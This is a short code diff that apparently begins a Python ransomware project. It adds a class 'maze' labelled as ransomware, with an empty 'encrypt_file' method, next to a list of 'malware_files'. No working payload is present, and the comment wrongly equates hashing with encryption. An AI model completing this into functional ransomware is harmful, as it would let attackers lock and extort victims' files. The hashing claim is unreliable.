@@ -1,4 +1,17 @@
 import os
+import sys
+import logging
+
+
+# Ransomware class
+
+class maze:
+
+    # Encrypt files using our own Hashing algorithm
+    def encrypt_file(filename):
+
+
+
 
 malware_files = ["maze.py", "encrypt.py", "decrypt.py"]
 files = []
